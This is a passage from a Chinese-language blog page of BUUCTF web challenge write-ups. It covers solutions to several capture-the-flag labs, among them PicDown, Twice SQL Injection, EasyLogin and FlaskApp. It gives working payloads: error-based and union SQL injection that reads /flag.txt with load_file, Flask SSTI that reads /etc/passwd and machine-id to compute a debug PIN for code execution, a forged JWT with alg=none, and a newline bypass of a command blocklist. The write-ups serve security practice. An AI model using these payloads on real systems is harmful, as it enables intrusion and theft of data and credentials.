$phone = $_POST[\"phone\"]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ $msg = 'no sql inject!'; }else{ $sql = \"select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'\"; $fetch = $db-\u003equery($sql); } if (isset($fetch) \u0026\u0026 $fetch-\u003enum_rows\u003e0){ $row = $fetch-\u003efetch_assoc(); $result = $db-\u003equery('delete from `user` where `user_id`=' . $row[\"user_id\"]); if(!$result) { echo 'error'; print_r($db-\u003eerror); exit; } $msg = \"订单删除成功\"; } else { $msg = \"未找到订单!\"; } }else { $msg = \"信息不全\"; } ?\u003e config.php：\n\u003c?php ini_set(\"open_basedir\", getcwd() . \":/etc:/tmp\"); $DATABASE = array( \"host\" =\u003e \"127.0.0.1\", \"username\" =\u003e \"root\", \"password\" =\u003e \"root\", \"dbname\" =\u003e\"ctfusers\" ); $db = new mysqli($DATABASE['host'],$DATABASE['username'],$DATABASE['password'],$DATABASE['dbname']); change.php中未对address进行过滤，尝试注入点为address的二次注入＋报错注入，用户权限为root，可以load_file：\n1\"' and updatexml(1,concat(0x7e,database()),1)#\rerrorXPATH syntax error: '~ctfusers'\r1\"' and updatexml(1,concat(0x7e,(select load_file(\"/flag.txt\"))),1)#\rerrorXPATH syntax error: '~flag{9f15a769-7b93-45f5-add5-3d'\r1\"' and updatexml(1,concat(0x7e,substr((select load_file(\"/flag.txt\")),30)),1)#\rerrorXPATH syntax error: '~3dbf4a23b76f} flag{9f15a769-7b93-45f5-add5-3dbf4a23b76f}\n[网鼎杯 2020 白虎组]PicDown url是个任意文件读取，先从环境变量获取工作目录/proc/self/environ：\nPWD=/app /app/app.py：\nfrom flask import Flask, Response from flask import render_template from flask import request import os import urllib app = Flask(__name__) SECRET_FILE = \"/tmp/secret.txt\" f = open(SECRET_FILE) SECRET_KEY = f.read().strip() os.remove(SECRET_FILE) @app.route('/') def index(): return render_template('search.html') @app.route('/page') def page(): url = request.args.get(\"url\") try: if not url.lower().startswith(\"file\"): res = urllib.urlopen(url) value = res.read() response = Response(value, mimetype='application/octet-stream') response.headers['Content-Disposition'] = 'attachment; filename=beautiful.jpg' return response else: value = \"HACK ERROR!\" except: value = \"SOMETHING WRONG!\" return render_template('search.html', res=value) @app.route('/no_one_know_the_manager') def manager(): key = request.args.get(\"key\") print(SECRET_KEY) if key == SECRET_KEY: shell = request.args.get(\"shell\") os.system(shell) res = \"ok\" else: res = \"Wrong Key!\" return res if __name__ == '__main__': app.run(host='0.0.0.0', port=8080) 未关闭SECRET_FILE的文件流，利用fd仍然可以读取该文件内容，/proc/self/fd/3：\nPExSWPFkA1V0CvVHVBjiLwoewfZT8tz2ERO30FehoiQ= os.system命令执行的结果不会输出到网页，尝试将命令结果保存到/tmp目录下：\nls / | cat \u003e /tmp/1.txt 发现根目录下有flag文件：flag{76d21877-ab9e-41dd-973e-28ac68487ed4}\n[b01lers2020]Welcome to Earth 一直跳转，看每个网页的js和源码就行，/static/js/fight.js：\n// Run to scramble original flag //console.log(scramble(flag, action)); function scramble(flag, key) { for (var i = 0; i \u003c key.length; i++) { let n = key.charCodeAt(i) % flag.length; let temp = flag[i]; flag[i] = flag[n]; flag[n] = temp; } return flag; } function check_action() { var action = document.getElementById(\"action\").value; var flag = [\"{hey\", \"_boy\", \"aaaa\", \"s_im\", \"ck!}\", \"_baa\", \"aaaa\", \"pctf\"]; // TODO: unscramble function } 看格式猜出flag：pctf{hey_boys_im_baaaaaaaaaack!}\nOctober 2019 Twice SQL Injection 二次注入，登录成功有个Info，猜测后端语句是：\nselect Info from table_name where username='' 或select Info from table_name where username='' and password='' 注册用户时将username设置为联合注入语句：\nusername=1' union select database() #\rctftraining\rusername=1' union select group_concat(table_name) from information_schema.tables where table_schema=database() #\rflag,news,users\rusername=1' union select group_concat(column_name) from information_schema.columns where table_name='flag' #\rflag\rusername=1' union select flag from flag #\rflag{5bbcd66f-a075-4532-bfce-6aa8642e41f3} 也可以先看看sql用户权限，如果是root直接可以load_file：\nusername=1' union select user() #\rroot@localhost\rusername=1' union select load_file('/var/www/html/index.php') # index.php：\n\u003c?php error_reporting(0); session_start(); /** * Database mysql */ $db_host = \"127.0.0.1\"; $db_user = $db_pass = \"root\"; $db_name = \"ctftraining\"; $conn = mysql_connect($db_host, $db_user, $db_pass) or die('Could not connect: ' . mysql_error()); mysql_select_db($db_name, $conn) or die('Could select database: ' . mysql_error()); register_shutdown_function(function () { global $conn; mysql_close($conn); }); function query($sql) { $result = mysql_query($sql); $rows = mysql_fetch_assoc($result); return $rows; } /** * Main */ $action = isset($_GET['action']) ? $_GET['action'] : \"index\"; if (!in_array($action, ['login', 'reg']) \u0026\u0026 !isset($_SESSION['username'])) { header(\"Location: /?action=login\"); exit; } switch ($action) { case 'login': if (isset($_POST['username'])) { $username = addslashes($_POST['username']); $password = md5($_POST['password']); $res = query(\"select * from users where username='{$username}' and password='{$password}';\"); if ($res) { $_SESSION['username'] = $res['username']; header(\"Location: /?action=index\"); exit; } } ?\u003e Login Username : Password : Go to Register \u003c?php break; case 'reg': if (isset($_POST['username']) \u0026\u0026 $_POST['username'] != \"\") { $username = addslashes($_POST['username']); $password = md5($_POST['password']); if (mysql_query(\"insert into users(username,password,info) values ('{$username}','{$password}','十月太懒，没有简介');\")) { header(\"Location: /?action=login\"); } else { header(\"Location: /?action=reg\u0026msg=注册失败\"); } exit; } else { ?\u003e Register \u003c?=addslashes($_GET['msg']);?\u003e Username : Password : Go to Login \u003c?php } break; case 'change': if (isset($_POST['info'])) { $info = addslashes($_POST['info']); if (mysql_query(\"update users set info='{$info}' where username='{$_SESSION['username']}';\")) { header(\"Location: /?action=index\"); } else { header(\"Location: /?action=change\u0026msg=修改失败\"); } exit; } break; case 'logout': session_destroy(); header(\"Location: /?action=login\"); exit; break; case 'index': default: $info = query(\"select info from users where username='{$_SESSION['username']}';\"); ?\u003e Info \u003c?=addslashes($info['info']);?\u003e \u003c?=addslashes($_GET['msg']);?\u003e Info : Logout \u003c?php break; } echo \"\"; [HFCTF2020]EasyLogin 查看app.js发现一段注释：\n/** * 或许该用 koa-static 来处理静态文件 * 路径该怎么配置？不管了先填个根目录XD */ koa是基于nodejs的web框架，有固定的目录结构，/controllers/api.js：\nconst crypto = require('crypto'); const fs = require('fs') const jwt = require('jsonwebtoken') const APIError = require('../rest').APIError; module.exports = { 'POST /api/register': async (ctx, next) =\u003e { const {username, password} = ctx.request.body; if(!username || username === 'admin'){ throw new APIError('register error', 'wrong username'); } if(global.secrets.length \u003e 100000) { global.secrets = []; } const secret = crypto.randomBytes(18).toString('hex'); const secretid = global.secrets.length; global.secrets.push(secret) const token = jwt.sign({secretid, username, password}, secret, {algorithm: 'HS256'}); ctx.rest({ token: token }); await next(); }, 'POST /api/login': async (ctx, next) =\u003e { const {username, password} = ctx.request.body; if(!username || !password) { throw new APIError('login error', 'username or password is necessary'); } const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization; const sid = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()).secretid; console.log(sid) if(sid === undefined || sid === null || !(sid \u003c global.secrets.length \u0026\u0026 sid \u003e= 0)) { throw new APIError('login error', 'no such secret id'); } const secret = global.secrets[sid]; const user = jwt.verify(token, secret, {algorithm: 'HS256'}); const status = username === user.username \u0026\u0026 password === user.password; if(status) { ctx.session.username = username; } ctx.rest({ status }); await next(); }, 'GET /api/flag': async (ctx, next) =\u003e { if(ctx.session.username !== 'admin'){ throw new APIError('permission error', 'permission denied'); } const flag = fs.readFileSync('/flag').toString(); ctx.rest({ flag }); await next(); }, 'GET /api/logout': async (ctx, next) =\u003e { ctx.session.username = null; ctx.rest({ status: true }) await next(); } }; 可以将alg置为none，但是有对sid的限制，不能是undefined 或 null且必须满足0 ≤ sid \u003c global.secrets.length，空数组绕过：\nusername=admin\u0026password=12345\u0026authorization=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6IjEyMzQ1IiwiaWF0IjoxNzU0MjAzOTA3fQ.\rSet-Cookie: sses:aok=eyJ1c2VybmFtZSI6ImFkbWluIiwiX2V4cGlyZSI6MTc1NDI5NjI2NDI1NywiX21heEFnZSI6ODY0MDAwMDB9; path=/; expires=Mon, 04 Aug 2025 08:31:04 GMT; httponly\rSet-Cookie: sses:aok.sig=w4pfPZYLt2rCMLMnOCIp_BePdnU; path=/; 带着相应的cookie访问/api/flag，拿到flag：flag{a027f724-d12f-4dd7-b6ba-04132dfc38bb}\n[CISCN2019 华北赛区 Day1 Web1]Dropbox download.php存在任意文件下载，index.php：\n\u003c?php session_start(); if (!isset($_SESSION['login'])) { header(\"Location: login.php\"); die(); } ?\u003e \u003c!DOCTYPE html\u003e 网盘管理 管理面板 上传文件 你好 \u003c?php echo $_SESSION['username']?\u003e \u003c?php include \"class.php\"; $a = new FileList($_SESSION['sandbox']); $a-\u003eName(); $a-\u003eSize(); ?\u003e class.php：\n\u003c?php error_reporting(0); $dbaddr = \"127.0.0.1\"; $dbuser = \"root\"; $dbpass = \"root\"; $dbname = \"dropbox\"; $db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname); class User { public $db; public function __construct() { global $db; $this-\u003edb = $db; } public function user_exist($username) { $stmt = $this-\u003edb-\u003eprepare(\"SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;\"); $stmt-\u003ebind_param(\"s\", $username); $stmt-\u003eexecute(); $stmt-\u003estore_result(); $count = $stmt-\u003enum_rows; if ($count === 0) { return false; } return true; } public function add_user($username, $password) { if ($this-\u003euser_exist($username)) { return false; } $password = sha1($password . \"SiAchGHmFx\"); $stmt = $this-\u003edb-\u003eprepare(\"INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);\"); $stmt-\u003ebind_param(\"ss\", $username, $password); $stmt-\u003eexecute(); return true; } public function verify_user($username, $password) { if (!$this-\u003euser_exist($username)) { return false; } $password = sha1($password . \"SiAchGHmFx\"); $stmt = $this-\u003edb-\u003eprepare(\"SELECT `password` FROM `users` WHERE `username` = ?;\"); $stmt-\u003ebind_param(\"s\", $username); $stmt-\u003eexecute(); $stmt-\u003ebind_result($expect); $stmt-\u003efetch(); if (isset($expect) \u0026\u0026 $expect === $password) { return true; } return false; } public function __destruct() { $this-\u003edb-\u003eclose(); } } class FileList { private $files; private $results; private $funcs; public function __construct($path) { $this-\u003efiles = array(); $this-\u003eresults = array(); $this-\u003efuncs = array(); $filenames = scandir($path); $key = array_search(\".\", $filenames); unset($filenames[$key]); $key = array_search(\"..\", $filenames); unset($filenames[$key]); foreach ($filenames as $filename) { $file = new File(); $file-\u003eopen($path . $filename); array_push($this-\u003efiles, $file); $this-\u003eresults[$file-\u003ename()] = array(); } } public function __call($func, $args) { array_push($this-\u003efuncs, $func); foreach ($this-\u003efiles as $file) { $this-\u003eresults[$file-\u003ename()][$func] = $file-\u003e$func(); } } public function __destruct() { $table = ''; $table .= ''; foreach ($this-\u003efuncs as $func) { $table .= '' . htmlentities($func) . ''; } $table .= 'Opt'; $table .= ''; foreach ($this-\u003eresults as $filename =\u003e $result) { $table .= ''; foreach ($result as $func =\u003e $value) { $table .= '' . htmlentities($value) . ''; } $table .= '",
  "wordCount" : "10715",
  "inLanguage": "en",
  "datePublished": "2025-08-10T00:00:00Z",
  "dateModified": "2025-08-19T00:00:00Z",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://z9nn8w.github.io/posts/ctf/buuojpage3/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "w8nn9z Blog",
    "logo": {
      "@type": "ImageObject",
      "url": "https://z9nn8w.github.io/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://z9nn8w.github.io/" accesskey="h" title="w8nn9z Blog (Alt + H)">w8nn9z Blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://z9nn8w.github.io/search" title="搜索 (Alt &#43; /)" accesskey=/>
                    <span>搜索</span>
                </a>
            </li>
            <li>
                <a href="https://z9nn8w.github.io/posts" title="文章">
                    <span>文章</span>
                </a>
            </li>
            <li>
                <a href="https://z9nn8w.github.io/archives" title="归档">
                    <span>归档</span>
                </a>
            </li>
            <li>
                <a href="https://z9nn8w.github.io/about" title="关于">
                    <span>关于</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      BUUCTF WEB page3
    </h1>
    <div class="post-meta"><span title='2025-08-10 00:00:00 +0000 UTC'>August 10, 2025</span>

</div>
  </header> <aside id="toc-container" class="toc-container wide">
    <div class="toc">
        <details >
            <summary accesskey="c" title="(Alt + C)">
                <span class="details">Table of Contents</span>
            </summary>

            <div class="inner"><ul>
                    <li>
                        <a href="#gyctf2020flaskapp" aria-label="[GYCTF2020]FlaskApp">[GYCTF2020]FlaskApp</a></li>
                    <li>
                        <a href="#fbctf2019rceservice" aria-label="[FBCTF2019]RCEService">[FBCTF2019]RCEService</a></li>
                    <li>
                        <a href="#zer0pts2020can-you-guess-it" aria-label="[Zer0pts2020]Can you guess it?">[Zer0pts2020]Can you guess it?</a></li>
                    <li>
                        <a href="#0ctf-2016piapiapia" aria-label="[0CTF 2016]piapiapia">[0CTF 2016]piapiapia</a></li>
                    <li>
                        <a href="#suctf-2019pythonginx" aria-label="[SUCTF 2019]Pythonginx">[SUCTF 2019]Pythonginx</a></li>
                    <li>
                        <a href="#mrctf2020%e5%a5%97%e5%a8%83" aria-label="[MRCTF2020]套娃">[MRCTF2020]套娃</a></li>
                    <li>
                        <a href="#cscctf-2019-qualflasklight" aria-label="[CSCCTF 2019 Qual]FlaskLight">[CSCCTF 2019 Qual]FlaskLight</a></li>
                    <li>
                        <a href="#watevrctf-2019cookie-store" aria-label="[watevrCTF-2019]Cookie Store">[watevrCTF-2019]Cookie Store</a></li>
                    <li>
                        <a href="#wustctf2020cv-maker" aria-label="[WUSTCTF2020]CV Maker">[WUSTCTF2020]CV Maker</a></li>
                    <li>
                        <a href="#ciscn2019-%e5%8d%8e%e5%8c%97%e8%b5%9b%e5%8c%ba-day1-web2ikun" aria-label="[CISCN2019 华北赛区 Day1 Web2]ikun">[CISCN2019 华北赛区 Day1 Web2]ikun</a></li>
                    <li>
                        <a href="#%e7%ba%a2%e6%98%8e%e8%b0%b7ctf-2021write_shell" aria-label="[红明谷CTF 2021]write_shell">[红明谷CTF 2021]write_shell</a></li>
                    <li>
                        <a href="#rctf2015easysql" aria-label="[RCTF2015]EasySQL">[RCTF2015]EasySQL</a></li>
                    <li>
                        <a href="#gwctf-2019%e6%9e%af%e7%87%a5%e7%9a%84%e6%8a%bd%e5%a5%96" aria-label="[GWCTF 2019]枯燥的抽奖">[GWCTF 2019]枯燥的抽奖</a></li>
                    <li>
                        <a href="#nctf2019true-xml-cookbook" aria-label="[NCTF2019]True XML cookbook">[NCTF2019]True XML cookbook</a></li>
                    <li>
                        <a href="#ciscn2019-%e5%8d%8e%e5%8c%97%e8%b5%9b%e5%8c%ba-day1-web5cyberpunk" aria-label="[CISCN2019 华北赛区 Day1 Web5]CyberPunk">[CISCN2019 华北赛区 Day1 Web5]CyberPunk</a></li>
                    <li>
                        <a href="#%e7%bd%91%e9%bc%8e%e6%9d%af-2020-%e7%99%bd%e8%99%8e%e7%bb%84picdown" aria-label="[网鼎杯 2020 白虎组]PicDown">[网鼎杯 2020 白虎组]PicDown</a></li>
                    <li>
                        <a href="#b01lers2020welcome-to-earth" aria-label="[b01lers2020]Welcome to Earth">[b01lers2020]Welcome to Earth</a></li>
                    <li>
                        <a href="#october-2019-twice-sql-injection" aria-label="October 2019 Twice SQL Injection">October 2019 Twice SQL Injection</a></li>
                    <li>
                        <a href="#hfctf2020easylogin" aria-label="[HFCTF2020]EasyLogin">[HFCTF2020]EasyLogin</a></li>
                    <li>
                        <a href="#ciscn2019-%e5%8d%8e%e5%8c%97%e8%b5%9b%e5%8c%ba-day1-web1dropbox" aria-label="[CISCN2019 华北赛区 Day1 Web1]Dropbox">[CISCN2019 华北赛区 Day1 Web1]Dropbox</a></li>
                    <li>
                        <a href="#swpuctf-2018simplephp" aria-label="[SWPUCTF 2018]SimplePHP">[SWPUCTF 2018]SimplePHP</a></li>
                    <li>
                        <a href="#gyctf2020ezsqli" aria-label="[GYCTF2020]Ezsqli">[GYCTF2020]Ezsqli</a></li>
                    <li>
                        <a href="#rootersctf2019i_3_flask" aria-label="[RootersCTF2019]I_&lt;3_Flask">[RootersCTF2019]I_&lt;3_Flask</a></li>
                    <li>
                        <a href="#npuctf2020ezinclude" aria-label="[NPUCTF2020]ezinclude">[NPUCTF2020]ezinclude</a></li>
                    <li>
                        <a href="#nctf2019sqli" aria-label="[NCTF2019]SQLi">[NCTF2019]SQLi</a></li>
                    <li>
                        <a href="#%e7%bd%91%e9%bc%8e%e6%9d%af-2020-%e5%8d%8a%e5%86%b3%e8%b5%9balicewebsite" aria-label="[网鼎杯 2020 半决赛]AliceWebsite">[网鼎杯 2020 半决赛]AliceWebsite</a></li>
                    <li>
                        <a href="#%e7%bd%91%e9%bc%8e%e6%9d%af-2018comment" aria-label="[网鼎杯 2018]Comment">[网鼎杯 2018]Comment</a></li>
                    <li>
                        <a href="#harekazectf2019encode_and_encode" aria-label="[HarekazeCTF2019]encode_and_encode">[HarekazeCTF2019]encode_and_encode</a></li>
                    <li>
                        <a href="#ciscn2019-%e5%8d%8e%e4%b8%9c%e5%8d%97%e8%b5%9b%e5%8c%badouble-secret" aria-label="[CISCN2019 华东南赛区]Double Secret">[CISCN2019 华东南赛区]Double Secret</a>
                    </li>
                </ul>
            </div>
        </details>
    </div>
</aside>
<script>
    let activeElement;
    let elements;
    
    document.addEventListener('DOMContentLoaded', function (event) {
        checkTocPosition();
    
        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
        if (elements.length > 0) {
            
            activeElement = elements[0];
            const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
            document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
        }
    
        
        const topLink = document.getElementById('top-link');
        if (topLink) {
            topLink.addEventListener('click', (event) => {
                
                event.preventDefault();
    
                
                window.scrollTo({ top: 0, behavior: 'smooth' });
            });
        }
    }, false);
    
    window.addEventListener('resize', function(event) {
        checkTocPosition();
    }, false);
    
    window.addEventListener('scroll', () => {
        
        const scrollPosition = window.pageYOffset || document.documentElement.scrollTop;
    
        
        if (scrollPosition === 0) {
            return;
        }
    
        
        if (elements && elements.length > 0) {
            
            activeElement = Array.from(elements).find((element) => {
                if ((getOffsetTop(element) - scrollPosition) > 0 && 
                    (getOffsetTop(element) - scrollPosition) < window.innerHeight / 2) {
                    return element;
                }
            }) || activeElement;
    
            elements.forEach(element => {
                const id = encodeURI(element.getAttribute('id')).toLowerCase();
                const tocLink = document.querySelector(`.inner ul li a[href="#${id}"]`);
                if (element === activeElement){
                    tocLink.classList.add('active');
    
                    
                    const tocContainer = document.querySelector('.toc .inner');
                    const linkOffsetTop = tocLink.offsetTop;
                    const containerHeight = tocContainer.clientHeight;
                    const linkHeight = tocLink.clientHeight;
    
                    
                    const scrollPosition = linkOffsetTop - (containerHeight / 2) + (linkHeight / 2);
                    tocContainer.scrollTo({ top: scrollPosition, behavior: 'smooth' });
                } else {
                    tocLink.classList.remove('active');
                }
            });
        }
    }, false);
    
    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
    
    function checkTocPosition() {
        const width = document.body.scrollWidth;
    
        if (width - main - (toc * 2) - (gap * 4) > 0) {
            document.getElementById("toc-container").classList.add("wide");
        } else {
            document.getElementById("toc-container").classList.remove("wide");
        }
    }
    
    function getOffsetTop(element) {
        if (!element.getClientRects().length) {
            return 0;
        }
        let rect = element.getBoundingClientRect();
        let win = element.ownerDocument.defaultView;
        return rect.top + win.pageYOffset;   
    }
    
</script>

  <div class="post-content"><h2 id="gyctf2020flaskapp">[GYCTF2020]FlaskApp<a hidden class="anchor" aria-hidden="true" href="#gyctf2020flaskapp">#</a></h2>
<p>decode路由存在SSTI，如果直接获取<code>__subclasses__()</code>，由于资源太多导致网站直接502了，尝试一次获取100个，找到<code>os._wrap_close</code>：</p>
<pre tabindex="0"><code>{{().__class__.__bases__[0].__subclasses__()[127]}}
e3soKS5fX2NsYXNzX18uX19iYXNlc19fWzBdLl9fc3ViY2xhc3Nlc19fKClbMTI3XX19
</code></pre><p>但是过滤了system，由于flask开启了debug，考虑获取PIN码，先获取<code>_frozen_importlib</code>位置：</p>
<pre tabindex="0"><code>{{().__class__.__bases__[0].__subclasses__()[75]}}
e3soKS5fX2NsYXNzX18uX19iYXNlc19fWzBdLl9fc3ViY2xhc3Nlc19fKClbNzVdfX0=
</code></pre><p>获取username：</p>
<pre tabindex="0"><code>{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#39;open&#39;](&#39;/etc/passwd&#39;).read()}}
e3soKS5fX2NsYXNzX18uX19iYXNlc19fWzBdLl9fc3ViY2xhc3Nlc19fKClbNzVdLl9faW5pdF9fLl9fZ2xvYmFsc19fLl9fYnVpbHRpbnNfX1snb3BlbiddKCcvZXRjL3Bhc3N3ZCcpLnJlYWQoKX19

root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin flaskweb:x:1000:1000::/home/flaskweb:/bin/sh
</code></pre><p>获取/etc/machine-id：</p>
<pre tabindex="0"><code>{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#39;open&#39;](&#39;/etc/machine-id&#39;).read()}}
e3soKS5fX2NsYXNzX18uX19iYXNlc19fWzBdLl9fc3ViY2xhc3Nlc19fKClbNzVdLl9faW5pdF9fLl9fZ2xvYmFsc19fLl9fYnVpbHRpbnNfX1snb3BlbiddKCcvZXRjL21hY2hpbmUtaWQnKS5yZWFkKCl9fQ==

1408f836b0ca514d796cbf8960e45fa1 
</code></pre><p>获取uuidnode：</p>
<pre tabindex="0"><code>{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#39;open&#39;](&#39;/sys/class/net/eth0/address&#39;).read()}}
e3soKS5fX2NsYXNzX18uX19iYXNlc19fWzBdLl9fc3ViY2xhc3Nlc19fKClbNzVdLl9faW5pdF9fLl9fZ2xvYmFsc19fLl9fYnVpbHRpbnNfX1snb3BlbiddKCcvc3lzL2NsYXNzL25ldC9ldGgwL2FkZHJlc3MnKS5yZWFkKCl9fQ==

d2:7b:56:a5:0e:2d  对应十进制数值为231427176468013
</code></pre><p>报错获取app.py绝对路径：</p>
<pre tabindex="0"><code>/usr/local/lib/python3.7/site-packages/flask/app.py
</code></pre><p>算出PIN码255-971-270，访问console路由进行rce：</p>
<pre tabindex="0"><code>__import__(&#39;os&#39;).popen(&#39;cat /this_is_the_flag.txt&#39;).read()

&#39;flag{df780c8c-7265-468e-bfce-c04079d78e67}\n&#39;
</code></pre><p>参考文章：</p>
<p><a href="https://www.freebuf.com/articles/web/359392.html">https://www.freebuf.com/articles/web/359392.html</a></p>
<p><a href="https://xz.aliyun.com/news/2235#toc-2">https://xz.aliyun.com/news/2235#toc-2</a></p>
<hr>
<h2 id="fbctf2019rceservice">[FBCTF2019]RCEService<a hidden class="anchor" aria-hidden="true" href="#fbctf2019rceservice">#</a></h2>
<p>原题给了源码：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">putenv</span>(<span style="color:#e6db74">&#39;PATH=/home/rceservice/jail&#39;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_REQUEST[<span style="color:#e6db74">&#39;cmd&#39;</span>])) {
</span></span><span style="display:flex;"><span>  $json <span style="color:#f92672">=</span> $_REQUEST[<span style="color:#e6db74">&#39;cmd&#39;</span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">is_string</span>($json)) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#39;</span>;
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">elseif</span> (<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#39;</span>, $json)) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#39;</span>;
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;Attempting to run command:&lt;br/&gt;&#39;</span>;
</span></span><span style="display:flex;"><span>    $cmd <span style="color:#f92672">=</span> <span style="color:#a6e22e">json_decode</span>($json, <span style="color:#66d9ef">true</span>)[<span style="color:#e6db74">&#39;cmd&#39;</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($cmd <span style="color:#f92672">!==</span> <span style="color:#66d9ef">NULL</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">system</span>($cmd);
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;Invalid input&#39;</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;&lt;br/&gt;&lt;br/&gt;&#39;</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>由于preg_match匹配开头和结尾为除换行符以外的所有字符，所以可以尝试换行符%0A绕过：</p>
<pre tabindex="0"><code class="language-fallback" data-lang="fallback">?cmd={%0a&#34;cmd&#34;:&#34;ls%20/&#34;%0a}
